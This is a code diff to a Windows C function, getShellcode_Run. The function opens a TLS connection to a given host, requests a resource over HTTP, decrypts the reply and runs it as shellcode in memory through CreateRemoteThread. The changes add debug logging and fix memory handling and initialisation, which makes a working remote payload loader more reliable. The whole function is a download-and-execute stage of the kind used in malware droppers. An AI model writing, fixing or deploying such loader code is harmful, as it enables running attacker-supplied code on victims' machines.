@@ -358,12 +358,14 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     struct addrinfo* result = NULL, *ptr = NULL, hints;
     char sendbuf[MAX_PATH] = "";
     char recvbuf[DEFAULT_BUFLEN];
-    char sslBuf[DEFAULT_BUFLEN * 4]; // Larger buffer for SSL data
+    char sslBuf[DEFAULT_BUFLEN * 4] = {0}; // Larger buffer for SSL data
     int sslBufLen = 0;
     int iResult;
     SECURITY_STATUS secStatus;
-    CredHandle hCred;
-    CtxtHandle hContext;
+    CredHandle hCred = {0};
+    CtxtHandle hContext = {0};
+    char* encryptedBuf = NULL; // Declared here, initialized later
+    int totalSize = 0;         // Declared here, initialized later
 
     // Construct HTTP request
     lstrcatA(sendbuf, "GET /");
@@ -371,6 +373,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     lstrcatA(sendbuf, " HTTP/1.1\r\nHost: ");
     lstrcatA(sendbuf, host);
     lstrcatA(sendbuf, "\r\nConnection: close\r\n\r\n");
+    printf("HTTP request prepared: %s\n", sendbuf);
 
     // Initialize Winsock
     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -378,6 +381,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         printf("WSAStartup failed: %d\n", iResult);
         return;
     }
+    printf("Winsock initialized\n");
 
     ZeroMemory(&hints, sizeof(hints));
     hints.ai_family = AF_INET;
@@ -391,18 +395,21 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         WSACleanup();
         return;
     }
+    printf("Address resolved for %s:%s\n", host, port);
 
     // Create socket and connect
     for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
         ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
         if (ConnectSocket == INVALID_SOCKET) {
-            printf("socket failed: %ld\n", WSAGetLastError());
+            printf("socket creation failed: %ld\n", WSAGetLastError());
+            freeaddrinfo(result);
             WSACleanup();
             return;
         }
 
         iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
         if (iResult == SOCKET_ERROR) {
+            printf("connect failed: %d\n", WSAGetLastError());
             closesocket(ConnectSocket);
             ConnectSocket = INVALID_SOCKET;
             continue;
@@ -416,6 +423,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         WSACleanup();
         return;
     }
+    printf("Connected to server on socket %d\n", (int)ConnectSocket);
 
     // Initialize security context for SSL/TLS
     SCHANNEL_CRED schannelCred = {0};
@@ -431,6 +439,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         WSACleanup();
         return;
     }
+    printf("Credentials handle acquired\n");
 
     // Perform SSL handshake
     SecBufferDesc outBuffer, inBuffer;
@@ -448,15 +457,18 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     secStatus = InitializeSecurityContextA(&hCred, NULL, (SEC_CHAR*)host, dwFlags, 0, 0, 
                                           NULL, 0, &hContext, &outBuffer, &dwFlags, NULL);
     if (secStatus != SEC_I_CONTINUE_NEEDED) {
-        printf("InitializeSecurityContext failed: %x\n", secStatus);
+        printf("InitializeSecurityContext (initial) failed: %x\n", secStatus);
         goto Cleanup;
     }
+    printf("Initial security context established\n");
 
     iResult = send(ConnectSocket, (char*)outBuffers[0].pvBuffer, outBuffers[0].cbBuffer, 0);
     if (iResult == SOCKET_ERROR) {
-        printf("send failed: %d\n", WSAGetLastError());
+        printf("send (initial handshake) failed: %d\n", WSAGetLastError());
+        FreeContextBuffer(outBuffers[0].pvBuffer);
         goto Cleanup;
     }
+    printf("Sent %d bytes for initial handshake\n", iResult);
 
     FreeContextBuffer(outBuffers[0].pvBuffer);
 
@@ -472,10 +484,11 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         if (inBuffers[0].cbBuffer == 0) {
             iResult = recv(ConnectSocket, sslBuf, sizeof(sslBuf), 0);
             if (iResult <= 0) {
-                printf("recv failed or connection closed: %d\n", WSAGetLastError());
+                printf("recv (handshake) failed or connection closed: %d\n", WSAGetLastError());
                 goto Cleanup;
             }
             inBuffers[0].cbBuffer = iResult;
+            printf("Received %d bytes for handshake\n", iResult);
         }
 
         secStatus = InitializeSecurityContextA(&hCred, &hContext, (SEC_CHAR*)host, dwFlags, 0, 0,
@@ -483,6 +496,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         
         if (secStatus == SEC_E_INCOMPLETE_MESSAGE) {
             inBuffers[0].cbBuffer = 0;
+            printf("Incomplete handshake message, waiting for more data\n");
             continue;
         }
 
@@ -492,20 +506,22 @@ void getShellcode_Run(char* host, char* port, char* resource) {
                 FreeContextBuffer(outBuffers[0].pvBuffer);
                 outBuffers[0].cbBuffer = 0;
                 if (iResult == SOCKET_ERROR) {
-                    printf("send failed: %d\n", WSAGetLastError());
+                    printf("send (handshake continuation) failed: %d\n", WSAGetLastError());
                     goto Cleanup;
                 }
+                printf("Sent %d bytes for handshake continuation\n", iResult);
             }
         }
 
-        if (secStatus == SEC_E_OK) break;
+        if (secStatus == SEC_E_OK) {
+            printf("SSL handshake completed successfully\n");
+            break;
+        } else if (secStatus != SEC_I_CONTINUE_NEEDED) {
+            printf("Handshake failed unexpectedly: %x\n", secStatus);
+            goto Cleanup;
+        }
 
-    } while (secStatus == SEC_I_CONTINUE_NEEDED);
-
-    if (secStatus != SEC_E_OK) {
-        printf("SSL handshake failed: %x\n", secStatus);
-        goto Cleanup;
-    }
+    } while (true);
 
     // Encrypt and send the HTTP request
     SecPkgContext_StreamSizes sizes;
@@ -515,25 +531,23 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         goto Cleanup;
     }
 
-    // Allocate buffer for encrypted data (header + message + trailer)
-    char* encryptedBuf = (char*)malloc(sizes.cbHeader + sizes.cbMaximumMessage + sizes.cbTrailer);
+    encryptedBuf = (char*)malloc(sizes.cbHeader + sizes.cbMaximumMessage + sizes.cbTrailer);
     if (!encryptedBuf) {
         printf("Memory allocation failed for encryptedBuf\n");
         goto Cleanup;
     }
 
-    // Prepare the buffers for encryption
     SecBuffer bufs[3];
-    bufs[0].pvBuffer = encryptedBuf;                        // Header
+    bufs[0].pvBuffer = encryptedBuf;
     bufs[0].cbBuffer = sizes.cbHeader;
     bufs[0].BufferType = SECBUFFER_STREAM_HEADER;
 
-    bufs[1].pvBuffer = encryptedBuf + sizes.cbHeader;       // Data
+    bufs[1].pvBuffer = encryptedBuf + sizes.cbHeader;
     bufs[1].cbBuffer = strlen(sendbuf);
     bufs[1].BufferType = SECBUFFER_DATA;
     memcpy(bufs[1].pvBuffer, sendbuf, bufs[1].cbBuffer);
 
-    bufs[2].pvBuffer = encryptedBuf + sizes.cbHeader + bufs[1].cbBuffer; // Trailer
+    bufs[2].pvBuffer = encryptedBuf + sizes.cbHeader + bufs[1].cbBuffer;
     bufs[2].cbBuffer = sizes.cbTrailer;
     bufs[2].BufferType = SECBUFFER_STREAM_TRAILER;
 
@@ -545,22 +559,21 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     secStatus = EncryptMessage(&hContext, 0, &message, 0);
     if (secStatus != SEC_E_OK) {
         printf("EncryptMessage failed: %x\n", secStatus);
-        free(encryptedBuf);
         goto Cleanup;
     }
+    printf("HTTP request encrypted successfully\n");
 
-    // Calculate total size of encrypted data after encryption
-    int totalSize = bufs[0].cbBuffer + bufs[1].cbBuffer + bufs[2].cbBuffer;
+    totalSize = bufs[0].cbBuffer + bufs[1].cbBuffer + bufs[2].cbBuffer;
+    printf("Total encrypted size: %d bytes\n", totalSize);
 
-    // Send the encrypted data
     iResult = send(ConnectSocket, encryptedBuf, totalSize, 0);
     if (iResult == SOCKET_ERROR) {
-        printf("send failed: %d\n", WSAGetLastError());
-        free(encryptedBuf);
+        printf("send (encrypted request) failed: %d\n", WSAGetLastError());
         goto Cleanup;
     }
+    printf("Sent %d bytes of encrypted HTTP request\n", iResult);
 
-    free(encryptedBuf); // Free after successful send
+    free(encryptedBuf);
     encryptedBuf = NULL;
 
     // Receive and decrypt the response
@@ -569,6 +582,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         iResult = recv(ConnectSocket, sslBuf + sslBufLen, sizeof(sslBuf) - sslBufLen, 0);
         if (iResult > 0) {
             sslBufLen += iResult;
+            printf("Received %d bytes of response data\n", iResult);
             inBuffers[0].pvBuffer = sslBuf;
             inBuffers[0].cbBuffer = sslBufLen;
             inBuffers[0].BufferType = SECBUFFER_DATA;
@@ -580,6 +594,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
             if (secStatus == SEC_E_OK) {
                 memcpy(recvbuf, inBuffers[1].pvBuffer, inBuffers[1].cbBuffer);
                 int payloadSize = inBuffers[1].cbBuffer;
+                printf("Decrypted %d bytes of shellcode\n", payloadSize);
 
                 // Execute shellcode
                 HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
@@ -589,16 +604,18 @@ void getShellcode_Run(char* host, char* port, char* resource) {
                 HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, 
                                                        (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
                 CloseHandle(processHandle);
-                break; // Exit after executing payload
+                printf("Shellcode executed\n");
+                break;
             } else if (secStatus == SEC_E_INCOMPLETE_MESSAGE) {
-                continue; // Wait for more data
+                printf("Incomplete response message, waiting for more data\n");
+                continue;
             } else {
                 printf("DecryptMessage failed: %x\n", secStatus);
                 break;
             }
-            sslBufLen = 0; // Reset buffer after decryption
+            sslBufLen = 0;
         } else if (iResult == 0) {
-            printf("Connection closed\n");
+            printf("Connection closed by server\n");
             break;
         } else {
             printf("recv failed: %d\n", WSAGetLastError());
@@ -612,4 +629,5 @@ Cleanup:
     FreeCredentialsHandle(&hCred);
     closesocket(ConnectSocket);
     WSACleanup();
+    printf("Cleanup completed\n");
 }
